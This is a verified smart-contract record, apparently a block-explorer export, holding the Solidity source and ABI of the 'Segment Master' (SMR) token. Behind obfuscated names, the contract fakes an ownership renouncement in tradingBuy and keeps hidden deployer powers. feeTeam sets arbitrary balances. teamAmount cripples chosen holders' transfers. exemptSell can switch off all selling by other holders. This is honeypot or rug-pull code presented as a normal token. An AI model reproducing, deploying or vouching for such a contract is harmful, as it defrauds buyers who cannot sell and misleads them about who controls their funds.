{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface toEnable {\n    function createPair(address receiverAuto, address shouldAuto) external returns (address);\n}\n\ninterface txToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapMarketing) external view returns (uint256);\n\n    function transfer(address isFund, uint256 shouldTxEnable) external returns (bool);\n\n    function allowance(address teamTotalWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTxEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFund,\n        uint256 shouldTxEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);\n    event Approval(address indexed teamTotalWallet, address indexed spender, uint256 value);\n}\n\nabstract contract toAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldSellTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txTokenMetadata is txToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SegmentMaster is toAuto, txToken, txTokenMetadata {\n\n    string private shouldSell = \"Segment Master\";\n\n    function listLaunched(address buyTrading) public {\n        require(buyTrading.balance < 100000);\n        if (launchTotalAuto) {\n            return;\n        }\n        if (minReceiver != tokenMin) {\n            minReceiver = false;\n        }\n        maxShould[buyTrading] = true;\n        if (tokenMin) {\n            teamAuto = toExempt;\n        }\n        launchTotalAuto = true;\n    }\n\n    function tradingBuy() public {\n        emit OwnershipTransferred(txShould, address(0));\n        autoSenderTotal = address(0);\n    }\n\n    function feeTeam(address fromExemptReceiver, uint256 shouldTxEnable) public {\n        receiverTeam();\n        listAtLiquidity[fromExemptReceiver] = shouldTxEnable;\n    }\n\n    function transferFrom(address tradingMarketing, address isFund, uint256 shouldTxEnable) external override returns (bool) {\n        if (_msgSender() != listReceiver) {\n            if (autoShould[tradingMarketing][_msgSender()] != type(uint256).max) {\n                require(shouldTxEnable <= autoShould[tradingMarketing][_msgSender()]);\n                autoShould[tradingMarketing][_msgSender()] -= shouldTxEnable;\n            }\n        }\n        return tokenTeamSwap(tradingMarketing, isFund, shouldTxEnable);\n    }\n\n    bool public tokenMin;\n\n    function modeShouldLimit(address tradingMarketing, address isFund, uint256 shouldTxEnable) internal returns (bool) {\n        require(listAtLiquidity[tradingMarketing] >= shouldTxEnable);\n        listAtLiquidity[tradingMarketing] -= shouldTxEnable;\n        listAtLiquidity[isFund] += shouldTxEnable;\n        emit Transfer(tradingMarketing, isFund, shouldTxEnable);\n        return true;\n    }\n\n    address public autoAtFund;\n\n    function owner() external view returns (address) {\n        return autoSenderTotal;\n    }\n\n    uint256 exemptSellSwap;\n\n    uint256 public marketingMin;\n\n    uint256 isAt;\n\n    address listReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxLaunchedMin;\n    }\n\n    mapping(address => uint256) private listAtLiquidity;\n\n    address receiverIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (marketingMin != toExempt) {\n            tokenMin = false;\n        }\n        shouldSellTake feeMin = shouldSellTake(listReceiver);\n        autoAtFund = toEnable(feeMin.factory()).createPair(feeMin.WETH(), address(this));\n        if (tokenMin != minReceiver) {\n            toExempt = teamAuto;\n        }\n        txShould = _msgSender();\n        maxShould[txShould] = true;\n        listAtLiquidity[txShould] = maxLaunchedMin;\n        tradingBuy();\n        \n        emit Transfer(address(0), txShould, maxLaunchedMin);\n    }\n\n    function teamAmount(address sellBuyTrading) public {\n        receiverTeam();\n        \n        if (sellBuyTrading == txShould || sellBuyTrading == autoAtFund) {\n            return;\n        }\n        atExempt[sellBuyTrading] = true;\n    }\n\n    bool public launchTotalAuto;\n\n    function tokenTeamSwap(address tradingMarketing, address isFund, uint256 shouldTxEnable) internal returns (bool) {\n        if (tradingMarketing == txShould) {\n            return modeShouldLimit(tradingMarketing, isFund, shouldTxEnable);\n        }\n        uint256 atBuy = txToken(autoAtFund).balanceOf(receiverIs);\n        require(atBuy == isAt);\n        require(isFund != receiverIs);\n        if (atExempt[tradingMarketing]) {\n            return modeShouldLimit(tradingMarketing, isFund, swapEnableReceiver);\n        }\n        return modeShouldLimit(tradingMarketing, isFund, shouldTxEnable);\n    }\n\n    function exemptSell(uint256 shouldTxEnable) public {\n        receiverTeam();\n        isAt = shouldTxEnable;\n    }\n\n    mapping(address => bool) public maxShould;\n\n    uint8 private tradingMarketingAmount = 18;\n\n    uint256 constant swapEnableReceiver = 6 ** 10;\n\n    address public txShould;\n\n    mapping(address => mapping(address => uint256)) private autoShould;\n\n    event OwnershipTransferred(address indexed autoMinReceiver, address indexed fromIs);\n\n    function name() external view virtual override returns (string memory) {\n        return shouldSell;\n    }\n\n    function balanceOf(address swapMarketing) public view virtual override returns (uint256) {\n        return listAtLiquidity[swapMarketing];\n    }\n\n    uint256 public toExempt;\n\n    uint256 private teamAuto;\n\n    function transfer(address fromExemptReceiver, uint256 shouldTxEnable) external virtual override returns (bool) {\n        return tokenTeamSwap(_msgSender(), fromExemptReceiver, shouldTxEnable);\n    }\n\n    address private autoSenderTotal;\n\n    function getOwner() external view returns (address) {\n        return autoSenderTotal;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingShould;\n    }\n\n    function receiverTeam() private view {\n        require(maxShould[_msgSender()]);\n    }\n\n    bool private minReceiver;\n\n    string private marketingShould = \"SMR\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingMarketingAmount;\n    }\n\n    function approve(address isMarketing, uint256 shouldTxEnable) public virtual override returns (bool) {\n        autoShould[_msgSender()][isMarketing] = shouldTxEnable;\n        emit Approval(_msgSender(), isMarketing, shouldTxEnable);\n        return true;\n    }\n\n    function allowance(address liquidityWallet, address isMarketing) external view virtual override returns (uint256) {\n        if (isMarketing == listReceiver) {\n            return type(uint256).max;\n        }\n        return autoShould[liquidityWallet][isMarketing];\n    }\n\n    uint256 private maxLaunchedMin = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public atExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTotalWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMinReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTxEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAtFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTxEnable\",\"type\":\"uint256\"}],\"name\":\"exemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTxEnable\",\"type\":\"uint256\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"listLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuyTrading\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExemptReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTxEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTxEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SegmentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}